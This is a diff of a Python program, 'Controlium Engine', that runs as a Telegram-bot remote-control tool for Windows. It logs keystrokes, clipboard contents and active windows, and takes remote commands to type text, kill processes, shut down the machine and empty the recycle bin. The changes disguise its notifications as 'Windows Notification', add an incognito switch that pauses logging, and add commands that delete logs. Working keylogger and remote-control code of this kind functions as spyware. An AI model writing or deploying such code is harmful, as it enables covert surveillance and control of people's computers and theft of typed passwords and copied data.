@@ -31,24 +31,25 @@ def telegram_alert(send):
 def win_notification(message):
     msg = message.text
     notification.notify(
-        title="Controlium Engine",
+        title="Windows Notification",
         message=msg,
         app_icon=None,
         timeout=5,)
-
+    
+incognito = False
 
 bot = telebot.TeleBot("BOT TOKEN")
 @bot.message_handler(func=lambda message: True)
 
 def command_engine(message):
+    global incognito
+
     try:
-        if message.text.lower() == "start":
-            pass
-        
-        elif message.text.lower() == "stop":
+
+        if message.text.lower() == "stop":
             notification.notify(
-                title="Controlium Engine",
-                message="Program terminated",
+                title="Windows Notification",
+                message="Control program terminated",
                 app_icon=None,
                 timeout=3,)
             
@@ -103,21 +104,13 @@ def command_engine(message):
             os.startfile("C:/Windows/explorer.exe")
             bot.reply_to(message, "Opened File Explorer")
 
-        elif message.text.lower() == "task manager":
-            os.startfile("C:\WINDOWS\system32\Taskmgr.exe")
-            bot.reply_to(message, "Opened Task Manager")
-
-        elif message.text.lower() == "access":
-            os.startfile("C:/Program Files/Microsoft Office/root/Office16/MSACCESS.EXE")
-            bot.reply_to(message, "Opened Microsoft Access")
-
         elif message.text.lower() == "alert":
-            bot.reply_to(message, "Enter notification messeage")
+            bot.reply_to(message, "Enter messeage")
             bot.register_next_step_handler(message, win_notification)
             bot.reply_to(message, "Done")
 
         elif message.text.lower() == "bg":
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/ashfa/OneDrive/Documents/My Projects/Controlium Engine (PY12824)/wallpaper7.jpg", 0)
+            #ctypes.windll.user32.SystemParametersInfoW(20, 0, pics, 0)
             bot.reply_to(message, "Changed wallpaper")
 
         elif message.text.lower() == "close all":
@@ -129,17 +122,29 @@ def command_engine(message):
             pyautogui.hotkey('ctrl', 'alt', 'down')
             bot.reply_to(message, "Closed window in focus")
 
-        elif message.text.lower() == "upside down":
-            pyautogui.hotkey('alt', 'f4')
-            bot.reply_to(message, "Changed display orientation")
-
-        elif "#" in message.text.lower():
-            user_chars = message.text
-            pyautogui.typewrite(user_chars)
+        elif message.text.lower() == "enter":
+            pyautogui.hotkey('enter')
             bot.reply_to(message, "Done")
 
         elif message.text.lower() == "undo":
             pyautogui.hotkey('ctrl', 'z')
+            bot.reply_to(message, "Done")
+
+        elif message.text.lower() == "copy":
+            pyautogui.hotkey('ctrl', 'c')
+            bot.reply_to(message, "Done")
+
+        elif message.text.lower() == "paste":
+            pyautogui.hotkey('ctrl', 'v')
+            bot.reply_to(message, "Done")
+
+        elif message.text.lower() == "select all":
+            pyautogui.hotkey('ctrl', 'a')
+            bot.reply_to(message, "Done")
+
+        elif "#" in message.text.lower():
+            user_chars = message.text
+            pyautogui.typewrite(user_chars)
             bot.reply_to(message, "Done")
 
         elif message.text.lower() == "close chrome":
@@ -158,10 +163,6 @@ def command_engine(message):
             os.system("taskkill /f /im POWERPNT.EXE")
             bot.reply_to(message, "Closed PowerPoint")
 
-        elif message.text.lower() == "close edge":
-            os.system("taskkill /f /im msedge.exe")
-            bot.reply_to(message, "Closed Microsoft Edge")
-
         elif message.text.lower() == "close vscode":
             os.system("taskkill /f /im Code.exe")
             bot.reply_to(message, "Closed VScode")
@@ -175,25 +176,51 @@ def command_engine(message):
             bot.reply_to(message, "System hibernation")
 
         elif message.text.lower() == "shutdown":
-            os.system("shutdown /s /t 10")
+            os.system("shutdown /s /t 30")
             bot.reply_to(message, "System shutdown")
 
         elif message.text.lower() == "clear bin":
             winshell.recycle_bin().empty(confirm=False, show_progress=True, sound=True)
             bot.reply_to(message, "Recycle bin cleared")
 
+        elif message.text.lower() == "incog":
+            incognito = True
+            bot.reply_to(message, "Incognito mode enabled")
+
+        elif message.text.lower() == "dis incog":
+            incognito = False
+            bot.reply_to(message, "Incognito mode disabled")
+
         elif message.text.lower() == "clear logs":
             try:
                 act_log = "Activity Logs"
                 txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]
+
                 for f in txtfiles:
                     os.remove(os.path.join(act_log, f))
-            except PermissionError:
                 bot.reply_to(message, "Deleted activity logs")
+
+            except Exception as e:
+                bot.reply_to(message, f"ERROR >> {e}")
+        
+        elif "clean" in message.text.lower():
+            month = message.text.split()[1].capitalize()
+            
+            try:
+                act_log = "Activity Logs"
+                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt") and f.startswith(month)]
+
+                for f in txtfiles:
+                    os.remove(os.path.join(act_log, f))
+                bot.reply_to(message, f"Deleted logs: {month}")
+
+            except Exception as e:
+                bot.reply_to(message, f"ERROR >> {e}")
 
         elif message.text.lower() == "clear keylogs":
             key_log = "Keystroke Logs"
             txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
+
             for f in txtfiles2:
                 os.remove(os.path.join(key_log, f))
             bot.reply_to(message, "Deleted keystroke logs")
@@ -216,9 +243,10 @@ def command_engine(message):
             bot.reply_to(message, f"Searching {query}")
 
         else:
-            bot.reply_to(message, "Invalid Command")
-    except:
-        bot.reply_to(message, "Error")
+            bot.reply_to(message, "Invalid command")
+            
+    except Exception as e:
+        bot.reply_to(message, f"ERROR >> {e}")
 
 ###############################################################################################
 
@@ -282,14 +310,16 @@ key_log_file = os.path.join(folder, log_file)
 
 
 def key_press(key):
-    try:
-        with open(key_log_file, "a") as f:
-            f.write(f"Key pressed: {key.char}\n")
-    except AttributeError:
-        with open(key_log_file, "a") as f:
-            f.write(f"Key pressed: {key}\n")
-    if key == keyboard.Key.print_screen:
-        logging.info("Screenshot taken")
+    if incognito != True:
+
+        try:
+            with open(key_log_file, "a") as f:
+                f.write(f"Key pressed: {key.char}\n")
+        except AttributeError:
+            with open(key_log_file, "a") as f:
+                f.write(f"Key pressed: {key}\n")
+        if key == keyboard.Key.print_screen:
+            logging.info("Screenshot taken")
 
 def key_release(key):
     if key == keyboard.Key.esc:
@@ -299,7 +329,7 @@ def key_release(key):
 def log_keystrokes():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.5.0
+        f.write(f'''CONTROLIUM ENGINE v1.5.1
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -319,7 +349,7 @@ def log_keystrokes():
 
 def log_activity():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.5.0
+    logging.info(f'''CONTROLIUM ENGINE v1.5.1
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -332,8 +362,10 @@ def log_activity():
 > System uptime: {uptime}
 > Process ID: {pid}
 ''')
+    
     while True:
-        log_windows()
+        if incognito != True:
+            log_windows()
 
 
 def network_connection():
@@ -353,7 +385,7 @@ def clipboard_activity():
 
     while True:
         current_clipboard = pyperclip.paste()
-        if current_clipboard != before_clipboard:
+        if current_clipboard != before_clipboard and incognito != True:
             logging.info(f"Clipboard changes: {current_clipboard}")
             before_clipboard = current_clipboard
 
@@ -372,6 +404,7 @@ def telegram_bot():
             bot.polling()
         except:
             time.sleep(5)
+
 
 ##########################################################################################
 
